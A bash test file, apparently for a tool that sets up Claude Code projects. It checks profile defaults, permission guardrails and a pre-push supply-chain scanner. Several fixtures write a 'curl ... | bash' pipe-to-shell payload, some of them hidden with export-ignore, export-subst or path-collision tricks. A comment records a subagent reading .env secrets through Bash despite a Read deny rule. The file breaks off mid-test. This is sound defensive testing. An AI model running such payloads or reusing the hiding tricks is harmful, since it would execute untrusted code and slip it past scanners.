#!/usr/bin/env bash
# Tests for bin/keel, part 3 of 5: the marketplace declaration, the nudge hook, staleness, the
# permission guardrails, the handoff, and keel scan --push. Shared helpers and fixtures are in
# tests/keel-test-lib.sh, which says why SC2015 is safe here.
#
# Run from the repository root.

# shellcheck disable=SC2015
# shellcheck disable=SC2016
set -uo pipefail; . "$(dirname "${BASH_SOURCE[0]}")/grep-quiet.sh"
# shellcheck source=tests/keel-test-lib.sh
. "$(dirname "${BASH_SOURCE[0]}")/keel-test-lib.sh"

# ---- the marketplace declaration keel init must not make ------------------
# A marketplace source says where this reader gets keel from, which is a fact about a machine and
# not about a project. Committed to a repository it asserts one answer for everyone who clones it,
# and it was wrong two ways at once: a reader outside the GitHub org cannot reach a private repo,
# and at project scope it shadowed the user's own declaration. Measured on the author's machine:
# user settings declared `gbi` as a directory source at the working repo, and known_marketplaces.json
# had resolved `gbi` to the github source with a clone of the merged main, so every keel project was
# loading published skills rather than the ones being edited.
#
# The working case is in the same function: every @claude-plugins-official plugin is enabled with no
# marketplace declaration at all and resolves fine, because that marketplace is known at user level.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
s=json.load(open('$d/.claude/settings.json'))
sys.exit(0 if 'extraKnownMarketplaces' not in s else 1)" \
  && ok "init declares no marketplace source in the committed settings" \
  || bad "marketplace" "init wrote extraKnownMarketplaces, which is a per-machine fact"

# Three keys out of the one profile in one read. Terse is the default a project gets without
# asking, and the key is written explicitly rather than left absent and defaulted, so a reader can
# see it and change it without first knowing it exists. explain_level is written for the same
# reason: technical is what a project gets without asking.
#
# The watchdog cannot read the window from a session, so gates.context_window is the only correct
# mechanism and nothing wrote it. 200000 is conservative and sometimes wrong, which is acceptable
# only because a configured window is a floor: a larger session raises it in flight rather than
# being stopped at 85% of the wrong number.
{ read -r response_style; read -r explain_level; read -r context_window; } <<EOF
$(prof_of "$d" conventions.response_style conventions.explain_level gates.context_window)
EOF
[ "$response_style" = terse ] \
  && ok "init writes conventions.response_style=terse" \
  || bad "response_style" "init did not write terse"

[ "$explain_level" = technical ] \
  && ok "init writes conventions.explain_level=technical" \
  || bad "explain_level" "init did not write technical"

[ "$context_window" = 200000 ] \
  && ok "init writes gates.context_window=200000" \
  || bad "context_window" "init did not write gates.context_window"

# gates.context_window was already declared by the schema, which is why writing it into init's
# output needed no SCHEMA_VERSION bump. This pins that fact rather than the version number it
# happened to sit at: the literal 1 was unsatisfiable by any legitimate bump, and it blocked the
# first one that came along (conventions.explain_level, 2026-08-18, which does add a key path and
# therefore does require the bump the fingerprint rule demands).
python3 -c "
import json,sys
g=json.load(open('$ROOT/templates/profile.schema.json'))['properties']['gates']['properties']
sys.exit(0 if 'context_window' in g else 1)" \
  && ok "context_window is schema-declared, so writing it needed no bump" \
  || bad "context_window" "gates.context_window is no longer declared by the schema"

# Re-running init is how a project picks up new keel defaults, and it must not quietly downgrade a
# 1M project to a 200000 window on the way. merge_profile gives a non-empty human value precedence;
# nothing asserted it for this key.
e="$(fixture node-ts)"
( cd "$e" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$e" <<'PY2'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=1000000
p.write_text(json.dumps(d,indent=2)+"\n")
PY2
( cd "$e" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
sys.exit(0 if json.load(open('$e/.keel/profile.json'))['gates']['context_window']==1000000 else 1)" \
  && ok "re-running init preserves a hand-set context_window" \
  || bad "context_window" "re-init overwrote a human value, downgrading a 1m project"

( cd "$e" && "$KEEL" init --force -y >/dev/null 2>&1 )
python3 -c "
import json,sys
sys.exit(0 if json.load(open('$e/.keel/profile.json'))['gates']['context_window']==200000 else 1)" \
  && ok "init --force replaces context_window, as it replaces the rest of the profile" \
  || bad "context_window" "--force left the old value"

# And the downgrade --force just performed is recoverable in flight, which is the only reason it is
# acceptable behaviour rather than a defect.
got="$(env -u KEEL_CONTEXT_WINDOW python3 -c "
import sys
sys.path.insert(0, '$ROOT/lib')
import context_watch
print(context_watch.window_for('claude-opus-5', observed=400000, configured=200000))
")"
[ "$got" = "1000000" ] && ok "a force-downgraded window is raised again by observation" \
  || bad "context_window" "got $got: --force would strand a 1m project at 200000"
rm -rf "$e"

# Four places describe how the window is decided and all four said an explicit setting simply wins.
# That stopped being true when the profile key became a floor. A description that is wrong is worse
# than none: it is read once and believed.
f="$(fixture node-ts)"
( cd "$f" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$f" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *"context watchdog available (window 200000"*) ok "doctor names the configured window" ;;
  *) bad "doctor window" "did not name the configured window" ;;
esac
case "$out" in
  *raised*) ok "doctor says the configured window can be raised by observation" ;;
  *) bad "doctor window" "doctor still presents the configured window as final" ;;
esac

python3 - "$f" <<'PY2'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
del d["gates"]["context_window"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY2
out="$( cd "$f" && "$KEEL" doctor 2>&1 )"
case "$out" in
  *"window assumed 200000"*) ok "doctor still explains an unset window for older profiles" ;;
  *) bad "doctor window" "the unset branch stopped being reachable or accurate" ;;
esac
rm -rf "$f"

grep -q 'floor' templates/profile.schema.json \
  && ok "the gates.context_window description describes the floor" \
  || bad "schema doc" "the schema still describes a configured window as simply winning"

# The bound must not be silent. It exists because a mistyped window disables the watchdog without
# saying so, and a bound that clamps without saying so has moved that failure rather than fixed it.
g="$(fixture node-ts)"
( cd "$g" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$g" <<'PY3'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=200000000
p.write_text(json.dumps(d,indent=2)+"\n")
PY3
out="$( cd "$g" && "$KEEL" doctor 2>&1 )"
case "$out" in *200000000*) ok "doctor names the configured value it bounded" ;;
  *) bad "bound report" "doctor did not name the configured 200000000" ;; esac
case "$out" in *1000000*) ok "doctor names the value actually in use" ;;
  *) bad "bound report" "doctor did not name the bounded 1000000" ;; esac

python3 - "$g" <<'PY3'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=1000000
p.write_text(json.dumps(d,indent=2)+"\n")
PY3
out="$( cd "$g" && "$KEEL" doctor 2>&1 )"
case "$out" in *"above the largest"*) bad "bound report" "doctor warned about a legitimate 1000000" ;;
  *) ok "doctor says nothing about bounding a window at the maximum" ;; esac
rm -rf "$g"

# Doctor must report the window the watchdog will actually use, not the number in the file. The
# profile key is a floor: it raises the starting window and never lowers it, so a value at or below
# the default is discarded. Reporting it as though it were in force tells someone who lowered the
# window to get an earlier pause that it worked, when nothing changed.
h="$(fixture node-ts)"
( cd "$h" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$h" <<'PY4'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["gates"]["context_window"]=50000
p.write_text(json.dumps(d,indent=2)+"\n")
PY4
out="$( cd "$h" && "$KEEL" doctor 2>&1 )"
case "$out" in *"window 50000 from gates"*) bad "doctor window" "doctor reports 50000 as in force; the watchdog uses 200000" ;;
  *) ok "doctor does not report a below-default window as the one in use" ;; esac
case "$out" in *200000*) ok "doctor names the window actually in force for a below-default setting" ;;
  *) bad "doctor window" "doctor did not name 200000, the window really in use" ;; esac

# And the environment override is what doctor must report when it is set, since it beats the file.
out="$( cd "$h" && KEEL_CONTEXT_WINDOW=500000 "$KEEL" doctor 2>&1 )"
case "$out" in *KEEL_CONTEXT_WINDOW*500000*|*500000*KEEL_CONTEXT_WINDOW*) ok "doctor reports the environment override when it is set" ;;
  *) bad "doctor window" "doctor ignored KEEL_CONTEXT_WINDOW while claiming it overrides" ;; esac
rm -rf "$h"

# The enabledPlugins entry stays. That is the part that is true of the project: this is the plugin
# set the repository expects, and a teammate running /plugin sees it already listed.
case "$(plugins_of "$d")" in *"keel@gbi"*) ok "init still records that the project expects keel@gbi" ;;
  *) bad "marketplace" "keel@gbi is no longer enabled: $(plugins_of "$d")" ;; esac

# Nothing in the committed file may name the private repository. The nudge names it, and should:
# an install instruction is advice a reader acts on, not a declaration a machine resolves.
grep -q 'gbi-solutions-ltd/keel' "$d/.claude/settings.json" \
  && bad "marketplace" "the committed settings.json names the private repo" \
  || ok "the committed settings.json names no private repository"
rm -rf "$d"

# ---- the plugin-less nudge hook -------------------------------------------
# Load-bearing per decision 1: with skills living in the plugin rather than the repo, this hook is
# the only thing that tells a session without the plugin that a standard exists at all.
#
# The hook cannot detect the plugin, and no rewrite of it can. CLAUDE_PLUGIN_ROOT is set only for
# hooks a plugin itself defines, pointing at that plugin's own directory; a hook registered in a
# project's settings.json never receives it. Measured in a live session: a project SessionStart hook
# sees CLAUDE_PROJECT_DIR and thirteen other CLAUDE_* variables, and not one of them names a loaded
# plugin. So the message is a conditional the reader evaluates against its own skill list, and these
# cases pin that it does not depend on the environment.

parent="$(mktemp -d)"
( cd "$parent" && "$KEEL" new svc-nudge --stack node >/dev/null 2>&1 )
d="$parent/svc-nudge"
[ -f "$d/.claude/keel-nudge" ] && ok "new writes the plugin-less nudge hook" || bad "nudge" "hook absent"

# Same output either way. Keying off CLAUDE_PLUGIN_ROOT made the hook silent under a test that set
# the variable by hand and loud in every real session, including ones with all 24 skills loaded.
with="$( cd "$d" && CLAUDE_PLUGIN_ROOT=/somewhere/keel .claude/keel-nudge 2>&1 )"
without="$( cd "$d" && env -u CLAUDE_PLUGIN_ROOT .claude/keel-nudge 2>&1 )"
{ [ -n "$without" ] && [ "$with" = "$without" ]; } && ok "the nudge does not key off CLAUDE_PLUGIN_ROOT" \
  || bad "nudge" "output depends on CLAUDE_PLUGIN_ROOT, which a project hook never receives"

# The condition has to be one the reader can check, which is its own skill list.
case "$without" in *'keel:'*) ok "nudge states a condition the reader can evaluate" ;;
  *) bad "nudge" "does not say how to tell whether the plugin is loaded: $without" ;; esac

case "$without" in *"marketplace add"*) ok "nudge names the install command" ;;
  *) bad "nudge" "said nothing useful: $without" ;; esac

# It must emit valid hook JSON, or the session start breaks rather than being nudged.
printf '%s' "$without" | python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null \
  && ok "nudge emits valid hook JSON" || bad "nudge" "output is not valid JSON"

# It prints in every session, so it sits in the prefix of every request of that session. Budgeted
# like the SessionStart injection beside it, estimated at chars/3.6 the same way.
n=$(printf '%s' "$without" | wc -c | tr -d ' ')
[ "$(( n * 10 / 36 ))" -le 200 ] && ok "nudge is within its 200-token budget" \
  || bad "nudge" "is about $(( n * 10 / 36 )) tokens, over the 200 ceiling"

# Registered in settings so a session actually runs it.
grep -q 'keel-nudge' "$d/.claude/settings.json" && ok "nudge is registered in settings.json" \
  || bad "nudge" "not registered as a SessionStart hook"
rm -rf "$parent"

# ---- staleness against the installed version -------------------------------
# Per-project files do not update themselves when the plugin does, so the profile has to record
# which keel wrote it. That only works if init overwrites the field, which the merge would
# otherwise refuse to do: every other value in the profile is one a human may have corrected.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )

# schema_version is the tool's, like keel_version. It answers "does this profile have the fields
# the installed keel expects", which keel_version cannot, because most releases change no field.
got="$(python3 -c "import json;print(json.load(open('$d/.keel/profile.json')).get('schema_version'))")"
want="$(sed -n 's/^SCHEMA_VERSION=\([0-9][0-9]*\)$/\1/p' "$ROOT/bin/keel")"
[ -n "$want" ] && [ "$got" = "$want" ] && ok "init writes the schema_version bin/keel declares" \
  || bad "schema_version" "profile has '$got', bin/keel declares '$want'"

python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); d["schema_version"] = 0
p.write_text(json.dumps(d, indent=2) + "\n")
PY
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" schema_version)"
[ "$got" = "$want" ] && ok "re-running init reclaims schema_version" \
  || bad "schema_version" "stayed '$got' after re-init, want '$want'"

out="$( cd "$d" && "$KEEL" profile set schema_version 2 2>&1 )" && rc=0 || rc=$?
case "$rc:$out" in
  1:*"written by init"*) ok "profile set refuses schema_version" ;;
  *) bad "schema_version" "profile set did not refuse: rc=$rc out=${out:0:80}" ;;
esac

python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); d["keel_version"] = "0.0.1-old"
p.write_text(json.dumps(d, indent=2) + "\n")
PY
out="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out" in *"configured by keel 0.0.1-old"*) ok "doctor reports which keel configured the project" ;;
  *) bad "staleness" "doctor did not report the configuring version" ;; esac

# The point of the split: an old keel_version alone is not staleness any more, because most
# releases change no field. Only a schema_version mismatch is.
# Matched on the staleness message's own tail, not on "Re-run 'keel init'", which doctor also emits
# for missing permission guardrails. The looser pattern passed only because init had just written
# those guardrails into this fixture, so a regression there would have failed this test and sent the
# reader to the wrong code.
case "$out" in *"to pick up the new fields"*) bad "staleness" "warned on keel_version alone, which fires on every release" ;;
  *) ok "an old keel_version alone does not raise the re-run warning" ;; esac

python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); del d["schema_version"]
p.write_text(json.dumps(d, indent=2) + "\n")
PY
out2="$( cd "$d" && "$KEEL" doctor 2>&1 )"
case "$out2" in *"schema version none"*) ok "doctor treats an absent schema_version as stale" ;;
  *) bad "staleness" "doctor did not notice a profile with no schema_version" ;; esac

( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" keel_version)"
want="$(cat "$ROOT/VERSION")"
[ "$got" = "$want" ] && ok "re-running init refreshes the recorded version" \
  || bad "staleness" "version stayed '$got', want '$want'"

# The tool owns that one field. Everything else in the profile still belongs to the human, and
# the same re-init must not have touched it.
python3 - "$d" <<'PY'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1]) / ".keel/profile.json"
d = json.loads(p.read_text()); d["verify"]["test"] = "npm test -- --runInBand"
p.write_text(json.dumps(d, indent=2) + "\n")
PY
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" verify.test)"
case "$got" in *runInBand*) ok "refreshing the version does not disturb human values" ;;
  *) bad "staleness" "verify.test was overwritten with '$got'" ;; esac
rm -rf "$d"

# ---- permission guardrails and the permission mode -------------------------
# The design: bypassPermissions per developer in the local file, guardrails for everyone in the
# committed one. It rests on deny and ask rules still applying once prompts are off, which was
# verified against a live session. These tests pin the file shapes that carry it.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )

python3 -c "
import json,sys
p=json.load(open('$d/.claude/settings.json'))['permissions']
sys.exit(0 if p.get('deny') and p.get('ask') else 1)" 2>/dev/null \
  && ok "init writes deny and ask rules into the committed settings" \
  || bad "guardrails" "no deny/ask rules in .claude/settings.json"

# A Read deny matches the Read tool and nothing else, so `cat .env` reaches the same bytes through a
# different door. Found when a subagent running under these exact rules reported .env contents it had
# read via Bash. The Bash entries are defence in depth, not a boundary, and the comment on
# keel_deny_rules says so; this asserts they are at least present.
python3 -c "
import json,sys
p=json.load(open('$d/.claude/settings.json'))['permissions']['deny']
sys.exit(0 if any(r.startswith('Bash(') and 'env' in r for r in p) else 1)" 2>/dev/null \
  && ok "the deny list covers reading a secret through Bash, not only through Read" \
  || bad "guardrails" "only Read is denied, so cat .env is unguarded"

# Egress. The deny list stops the file tools reading a secret; nothing stopped a session posting
# whatever it could already read, which decision 12 recorded as the open gap when it accepted the
# bypassPermissions default. Asserted per command rather than as a count, because a count passes
# while naming the wrong three.
for cmd in curl wget nc; do  # supply-chain-scan: allow the commands this assertion looks for in the rule list
  python3 -c "
import json,sys
p=json.load(open('$d/.claude/settings.json'))['permissions']['ask']
sys.exit(0 if any(r.startswith('Bash($cmd ') for r in p) else 1)" 2>/dev/null \
    && ok "the ask list restores a prompt for $cmd" \
    || bad "guardrails" "$cmd is not in the ask list, so egress is unprompted under bypassPermissions"
done

# The security property of the whole split. A committed bypassPermissions turns off prompts for
# everyone who clones the repository, before they have read a line of it.
grep -q 'bypassPermissions' "$d/.claude/settings.json" \
  && bad "guardrails" "bypassPermissions leaked into the committed settings.json" \
  || ok "the committed settings.json sets no permission mode"

grep -q 'bypassPermissions' "$d/.claude/settings.local.json" 2>/dev/null \
  && ok "init sets bypassPermissions in the local settings" \
  || bad "guardrails" "no defaultMode in .claude/settings.local.json"

( cd "$d" && git check-ignore -q .claude/settings.local.json ) \
  && ok "init git-ignores the local settings file" \
  || bad "guardrails" ".claude/settings.local.json is not ignored"

# A mature repo already has both files, and is exactly the case that most needs the guardrails.
# Nothing already in them may be lost.
d2="$(fixture node-ts)"
mkdir -p "$d2/.claude"
printf '{ "enabledPlugins": { "someone-elses@thing": true } }\n' > "$d2/.claude/settings.json"
printf '{ "permissions": { "allow": ["Bash(npm test:*)"] } }\n' > "$d2/.claude/settings.local.json"
( cd "$d2" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
s=json.load(open('$d2/.claude/settings.json'))
l=json.load(open('$d2/.claude/settings.local.json'))
sys.exit(0 if ('someone-elses@thing' in s.get('enabledPlugins',{})
            and s['permissions']['deny']
            and 'Bash(npm test:*)' in l['permissions']['allow']
            and l['permissions']['defaultMode']=='bypassPermissions') else 1)" 2>/dev/null \
  && ok "merging guardrails preserves existing settings and allow rules" \
  || bad "guardrails" "merge lost pre-existing settings"

# Re-running must not accumulate duplicates: doctor compares against the same lists.
( cd "$d2" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
p=json.load(open('$d2/.claude/settings.json'))['permissions']
sys.exit(0 if len(p['deny'])==len(set(p['deny'])) and len(p['ask'])==len(set(p['ask'])) else 1)" 2>/dev/null \
  && ok "re-running init does not duplicate guardrails" \
  || bad "guardrails" "duplicate rules after a second init"

# doctor must notice both ways the design can be broken after the fact.
# Capture doctor's output rather than piping it: doctor exits non-zero by design when it finds a
# problem, and under `set -o pipefail` that status is what the pipeline returns, not grep's. Piping
# here silently inverts the test, which is the failure this comment exists to stop recurring.
d3="$(fixture node-ts)"
( cd "$d3" && "$KEEL" init -y >/dev/null 2>&1 )
printf '{ "permissions": { "deny": [], "ask": [] } }\n' > "$d3/.claude/settings.json"
out="$( cd "$d3" && "$KEEL" doctor 2>&1 )"
case "$out" in *"permission guardrail(s) missing"*) ok "doctor fails when the guardrails have been removed" ;;
  *) bad "guardrails" "doctor did not notice missing guardrails" ;; esac

# The global excludes file is neutralised because a developer's global gitignore may already cover
# `.claude/settings.local.json`, as this author's does. Without that, emptying the repository's
# .gitignore leaves the file still ignored, the check still passes, and the test proves nothing
# about the line keel writes. It is the repository's own .gitignore that has to protect a
# teammate who has no such global rule.
d4="$(fixture node-ts)"
( cd "$d4" && "$KEEL" init -y >/dev/null 2>&1 && : > .gitignore )
out="$( cd "$d4" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"not git-ignored"*) ok "doctor fails when the local settings file would be committed" ;;
  *) bad "guardrails" "doctor did not notice a committable settings.local.json" ;; esac

# And the positive case, isolated the same way: the line keel writes must do the job alone.
d5="$(fixture node-ts)"
( cd "$d5" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$d5" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"settings.local.json is git-ignored"*) ok "the .gitignore line keel writes ignores the file on its own" ;;
  *) bad "guardrails" "keel's own .gitignore line did not ignore the local settings file" ;; esac
rm -rf "$d5"
rm -rf "$d" "$d2" "$d3" "$d4"

# ---- the handoff stays out of git -----------------------------------------
# The same three properties as the local settings file, for the same reason: a file the tooling
# writes into a working tree gets committed by the next `git add -A` unless a rule stops it. The
# handoff is session state, stale the moment work resumes, and it has reached a commit twice.
d6="$(fixture node-ts)"
( cd "$d6" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d6" && git check-ignore -q .keel/handoff.md ) \
  && ok "init git-ignores the handoff file" \
  || bad "handoff" ".keel/handoff.md is not ignored"

# The seen-marker moved out of the tree (hooks/session-start writes it under $TMPDIR now), so it
# never reaches the working tree and needs no rule of its own. A stray line would just be dead
# weight, and its reappearance would mean the marker regressed back into the tree.
if grep -qxF ".keel/handoff.seen" "$d6/.gitignore" 2>/dev/null; then
    bad "handoff" "init still writes a .gitignore rule for .keel/handoff.seen, which no longer lives in the tree"
else
    ok "init does not write a .gitignore rule for the out-of-tree seen marker"
fi

# Isolated from a developer's global excludes, as above: the repository's own line has to do the job
# for a teammate who has no such global rule.
d7="$(fixture node-ts)"
( cd "$d7" && "$KEEL" init -y >/dev/null 2>&1 )
printf '# Session handoff\n' > "$d7/.keel/handoff.md"
out="$( cd "$d7" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"handoff.md is git-ignored"*) ok "the .gitignore line keel writes ignores the handoff on its own" ;;
  *) bad "handoff" "keel's own .gitignore line did not ignore the handoff" ;; esac

# A handoff already in the index is the case the ignore line cannot fix on its own, and the one that
# actually happened. git check-ignore reports a tracked path as not ignored, so doctor catches both.
d8="$(fixture node-ts)"
( cd "$d8" && "$KEEL" init -y >/dev/null 2>&1 )
printf '# Session handoff\n' > "$d8/.keel/handoff.md"
( cd "$d8" && git add -f .keel/handoff.md >/dev/null 2>&1 )
out="$( cd "$d8" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null "$KEEL" doctor 2>&1 )"
case "$out" in *"handoff.md is not git-ignored"*) ok "doctor fails when the handoff file would be committed" ;;
  *) bad "handoff" "doctor did not notice a committable handoff" ;; esac

# A .gitignore whose last line has no newline terminator, which is what a real repository hands you.
# Found on the existing-service pilot: the append welded keel's rule onto the project's own last
# line, producing one line that matches nothing. It destroyed the rule that was already there and
# added neither of keel's. Both ignores are asserted because the concatenation consumes the first
# rule and drops the second, and either alone would miss half of it.
d9="$(fixture node-ts)"
printf 'node_modules/\n.claude/settings.local.json' > "$d9/.gitignore"   # deliberately unterminated
( cd "$d9" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d9" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null \
    git check-ignore -q .claude/settings.local.json ) \
  && ok "an unterminated .gitignore keeps the rule it already had" \
  || bad "handoff" "init corrupted the project's own last .gitignore line"
( cd "$d9" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile GIT_CONFIG_VALUE_0=/dev/null \
    git check-ignore -q .keel/handoff.md ) \
  && ok "an unterminated .gitignore still gets keel's own rules appended" \
  || bad "handoff" ".keel/handoff.md is not ignored after appending to an unterminated .gitignore"

# The check has to answer "would a teammate who clones this commit the file", not "is it ignored on
# this machine". A developer's global excludes answers the second question yes while the repository
# carries no rule at all, and doctor then reports ok on a repository that protects nobody else.
#
# This is not hypothetical: it is why the unterminated-.gitignore bug above survived a doctor run
# that said ok. The author's own ~/.gitignore covers settings.local.json, so destroying the
# repository's rule changed nothing doctor could see.
d10="$(fixture node-ts)"
( cd "$d10" && "$KEEL" init -y >/dev/null 2>&1 && : > .gitignore )
printf '.claude/settings.local.json\n.keel/handoff.md\n' > "$d10/global-excludes"
printf '# Session handoff\n' > "$d10/.keel/handoff.md"
out="$( cd "$d10" && GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile \
        GIT_CONFIG_VALUE_0="$d10/global-excludes" "$KEEL" doctor 2>&1 )"
case "$out" in *"settings.local.json is not git-ignored"*)
    ok "doctor ignores a global excludes rule when checking the local settings file" ;;
  *) bad "guardrails" "doctor accepted a global excludes rule in place of the repository's own" ;; esac
case "$out" in *"handoff.md is not git-ignored"*)
    ok "doctor ignores a global excludes rule when checking the handoff" ;;
  *) bad "handoff" "doctor accepted a global excludes rule in place of the repository's own" ;; esac
rm -rf "$d6" "$d7" "$d8" "$d9" "$d10"

# ---- invoked through a symlink on PATH ------------------------------------
# The documented install is a symlink into a directory on PATH. dirname does not follow symlinks,
# so before the fix HERE resolved to the symlink's directory: lib/ failed to source, VERSION fell
# back to 0.0.0, and templates were silently absent. It reported success while doing nothing.

parent="$(mktemp -d)"
ln -s "$KEEL" "$parent/keel"
real_version="$(cat "$(dirname "$KEEL")/../VERSION")"
[ "$("$parent/keel" version)" = "$real_version" ] \
  && ok "invoked through a symlink, keel finds its own VERSION" \
  || bad "symlink" "version through a symlink was not $real_version"

# init is the real proof: it needs lib/ and templates/, which is what a broken HERE loses.
proj="$parent/via-symlink"
mkdir -p "$proj" && ( cd "$proj" && git init -q . && "$parent/keel" init -y >/dev/null 2>&1 )
[ -s "$proj/docs/keel/prompting.md" ] \
  && ok "invoked through a symlink, init still reaches its templates" \
  || bad "symlink" "init through a symlink did not write the prompting cheatsheet"

# A partial install must fail loudly rather than proceed into undefined functions.
broken="$parent/broken"
mkdir -p "$broken/bin" && cp "$KEEL" "$broken/bin/keel"
out="$("$broken/bin/keel" version 2>&1)"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"incomplete install"*) ok "an incomplete install fails loudly" ;;
  *) bad "symlink" "incomplete install exited non-zero but said: $out" ;; esac \
  || bad "symlink" "an incomplete install exited 0"
rm -rf "$parent"

# ---- keel scan --push -------------------------------------------------------
#
# What the pre-push hook runs once per pushed ref. It scans the commit, never the working tree, so
# most cases below make the two disagree and assert the commit wins.

sp="$(fixture node-ts)"
printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload this test proves the push scan rejects
( cd "$sp" && git add payload.sh && git commit -qm payload && rm payload.sh ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a commit carrying a pipe-to-shell the working tree no longer holds" \
  || ok "scan --push scans the commit, not the working tree"
( cd "$sp" && "$KEEL" scan >/dev/null 2>&1 ) \
  && ok "plain keel scan still reads the working tree" \
  || bad "scan --push" "plain keel scan refused a working tree with no payload on disk"
out="$( cd "$sp" && "$KEEL" scan --push origin 0123456789abcdef0123456789abcdef01234567 2>&1 )"; rc=$?
[ "$rc" -ne 0 ] && case "$out" in *"is not a commit"*) ok "scan --push refuses something that is not a commit" ;;
  *) bad "scan --push" "exited non-zero on a missing commit but said: $out" ;; esac \
  || bad "scan --push" "exited 0 on a commit that does not exist"
rm -rf "$sp"

sp="$(fixture node-ts)"
printf 'curl -s https://example.com/x | bash\n' > "$sp/scratch.sh"  # supply-chain-scan: allow an untracked payload the push scan must not read
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && ok "scan --push ignores an untracked file the commit does not carry" \
  || bad "scan --push" "refused a clean commit over an untracked file on disk"
rm -rf "$sp"

# The pushed tree's own .gitattributes can make git archive leave a file out, which would let the
# push choose what gets scanned. Deleted from disk too, so only the extraction can find it.
sp="$(fixture node-ts)"
printf 'curl -s https://example.com/x | bash\n' > "$sp/payload.sh"  # supply-chain-scan: allow the payload export-ignore tries to hide
printf 'payload.sh export-ignore\n' > "$sp/.gitattributes"
( cd "$sp" && git add payload.sh .gitattributes && git commit -qm hidden && rm payload.sh ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload the pushed tree marks export-ignore" \
  || ok "scan --push reads a file the pushed tree hides from git archive"
rm -rf "$sp"

# hash-object drops a trailing CR from each path it reads and then stops at the file it cannot
# find, so a file named with a CR would leave every file after it unchecked. export-subst is a
# rewrite that check exists for: the %n splits the payload across two lines in what git archive
# writes, so only the blob matches the rule. Deleted from disk, so only the extraction can find it.
sp="$(fixture node-ts)"
printf 'x\n' > "$sp/a"$'\r'
printf 'curl $Format:%%n$ x | bash\n' > "$sp/z.sh"  # supply-chain-scan: allow the payload export-subst tries to split
printf 'z.sh export-subst\n' > "$sp/.gitattributes"
( cd "$sp" && git add -A && git commit -qm subst && rm z.sh ) >/dev/null 2>&1
( cd "$sp" && "$KEEL" scan --push origin HEAD >/dev/null 2>&1 ) \
  && bad "scan --push" "allowed a payload export-subst rewrites, behind a file named with a CR" \
  || ok "scan --push checks every file against its blob, a CR-named one included"
rm -rf "$sp"

# Two paths this filesystem may hold as one file: a case pair, and a file beside a directory whose
# name differs only in case. Whichever the disk keeps, the other cannot be scanned, so the scan
# refuses. Built with plumbing, since no working tree on a case-folding disk can hold both. On a
# case-sensitive filesystem there is no collision and the payload is simply found.
sp="$(fixture node-ts)"
pay="$( cd "$sp" && printf 'curl -s https://example.com/x | bash\n' | git hash-object -w --stdin )"  # supply-chain-scan: allow the payload a path collision tries to hide
okb="$( cd "$sp" && printf 'echo ok\n' | git hash-object -w --stdin )"
c="$( cd "$sp" && git commit-tree -m case "$(printf '100644 blob %s\tPayload.sh\n100644 blob %s\tpayload.sh\n' "$okb" "$pay" | git mktree)" )"
